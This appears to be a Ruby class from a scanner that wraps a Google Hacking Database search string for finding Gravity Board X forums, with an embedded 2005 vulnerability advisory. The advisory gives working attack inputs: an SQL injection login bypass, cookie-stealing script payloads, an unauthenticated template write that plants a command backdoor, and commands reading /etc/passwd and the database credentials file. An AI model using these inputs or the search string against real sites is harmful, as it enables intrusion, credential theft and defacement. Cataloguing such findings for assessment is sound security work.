module Dorks
   class Dork1051 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1051",
            ghdb_url: "https://www.exploit-db.com/ghdb/1051",
            severity: "2",
            category: "vulnerable_files",
            publish_date: "2005-08-07",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by Gravity Board"
EDORK
            description: <<~EDESC
4.22 07/08/2005 Gravity Board X v1.1 (possibly prior versions) Remote code execution, SQL Injection / Login Bypass, cross site scripting, path disclosure poc software: author site: http://www.gravityboardx.com/ a) Sql Injection / Login Bypass: If magic_quotes off, A user can bypass login check and grant administrator privileges on target system: login: ' or isnull(1/0) /* password: whatever b) Cross site scripting poc: b.1)After he login as administrator he can edit template to insert evil javascript code. Try to insert at the end of the template these lines: alert(document.cookie) b.2)A user can craft a malicious url like this to access target user cookies: http://[target]/[path]/deletethread.php?board_id=">alert(document.cookie) c) Remote commands/php code execution: c.1) Always editing the template, attacker can leave a backdoor in target system, example, at the end of template: After, the attacker can launch commands by this urls: http://[target]/[path]/index.php?cmd=ls%20-la to list directories... http://[target]/[path]/index.php?cmd=cat%20/etc/passwd to see Unix /etc/passwd file http://[target]/[path]/index.php?cmd=cat%20config.php to see database username/password c.2) An IMPORTANT NOTE: You can edit template without to be logged in as administator, calling editcss.php script, look at the code of this script: if($fp = fopen('gbxfinal.css','w')){ fwrite($fp, $csscontent); fclose($fp); echo ''; }else{ echo 'Gravity Board X was unable to save changes to the CSS template.'; } you can easily deface the forum and/or insert a backdoor calling an url like this: http://[target]/[path]/editcss.php?csscontent= then execute commands: http://[target]/[path]/index?cmd=[command] It's also possible to disclose path: d) path disclosure: http://[target]/[path]/deletethread.php?perm=1 http://[target]/[path]/ban.php http://[target]/[path]/addnews.php http://[target]/[path]/banned.php http://[target]/[path]/boardstats.php http://[target]/[path]/adminform.php http://[target]/[path]/forms/admininfo.php http://[target]/[path]/forms/announcements.php http://[target]/[path]/forms/banform.php ans so on...calling scripts in /forms directory
EDESC
         })

      end
   end
end
